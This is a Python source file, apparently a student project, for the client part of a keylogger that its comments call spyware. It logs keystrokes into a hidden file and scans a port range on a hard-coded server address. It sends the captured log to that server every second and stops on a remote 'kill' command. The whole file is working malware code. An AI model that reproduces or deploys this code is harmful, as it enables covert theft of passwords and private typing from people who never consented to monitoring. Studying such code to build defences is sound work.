#!/usr/bin/env python3
# Réalisé par Marc WILMOT et Anthony BAYRAKTAR
# Projet : Spyware
# Description du projet : Réalisation d'un spyware en Python avec une partie serveur et une partie client
# Date de rendu : 31/01/2024


import os
import platform
import socket
import time
import select
from pynput.keyboard import Listener, Key, KeyCode

# Variables pour la connexion au serveur avec le client (à modifier)
SERVER = '192.168.1.3' # Adresse IP du serveur à modifier selon l'usage
PORT_START = 10000
PORT_END = 11000
CONNECT_TIMEOUT = 600  # Temps maximum (en secondes) pour tenter de se connecter (10 minutes)

def get_log_filename():
    """ Retourne le chemin du fichier de log selon l'OS. """
    if platform.system() == "Linux":
        return "/tmp/.log.txt"
    elif platform.system() == "Windows":
        return os.path.join(os.path.expanduser('~'), "log.txt")
    else:
        print("Le système d'exploitation n'est pas pris en charge.")
        exit(1)

def on_press(key):
    """ Enregistre les frappes clavier dans le fichier de log. """
    log_filename = get_log_filename()
    with open(log_filename, "a") as logfile:
        if hasattr(key, 'char') and key.char:
            logfile.write(key.char)
        elif isinstance(key, KeyCode) and 96 <= key.vk <= 105:
            logfile.write(str(key.vk - 96))  # Touches numériques du pavé numérique
        elif key == Key.space:
            logfile.write(' ')
        elif key == Key.enter:
            logfile.write('\n')
        # else: Ajouter ici d'autres cas pour les touches spéciales

def establish_connection():
    start_time = time.time()
    for port in range(PORT_START, PORT_END + 1):
        if time.time() - start_time >= CONNECT_TIMEOUT:
            print("Temps imparti écoulé, impossible de se connecter.")
            return None
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect((SERVER, port))
            s.settimeout(None)
            print(f"Connecté au serveur sur le port {port}")
            return s
        except Exception as e:
            print(f"Connexion échouée sur le port {port}: {e}")
            s.close()

    print("Connexion au serveur impossible après le temps imparti.")
    return None

def send_log(socket_conn):
    """ Envoie le fichier de log au serveur. """
    log_filename = get_log_filename()
    try:
        with open(log_filename, "rb") as logfile:
            socket_conn.sendfile(logfile)
        open(log_filename, "w").close()
    except Exception as e:
        print(f"Erreur lors de l'envoi des données: {e}")

def check_for_command(socket_conn):
    """ Vérifie les commandes envoyées par le serveur. """
    try:
        if select.select([socket_conn], [], [], 0.1)[0]:
            command = socket_conn.recv(1024).decode()
            if command == "kill":
                print("Commande 'kill' reçue, arrêt du client.")
                clean_up_and_exit(socket_conn)
    except Exception as e:
        print(f"Erreur lors de la réception de la commande: {e}")
        clean_up_and_exit(socket_conn)

def clean_up_and_exit(socket_conn):
    """ Nettoie et ferme l'application. """
    print("Arrêt du keylogger.")
    listener.stop()
    if socket_conn:
        socket_conn.close()
    log_filename = get_log_filename()
    if os.path.exists(log_filename):
        os.remove(log_filename)
    os._exit(0)

if __name__ == "__main__":
    listener = Listener(on_press=on_press)
    listener.start()

    server_conn = establish_connection()
    if server_conn:
        while True:
            time.sleep(1)
            send_log(server_conn)
            check_for_command(server_conn)
    else:
        print("Le client va s'arrêter, car il ne peut pas se connecter au serveur.")
        listener.stop()
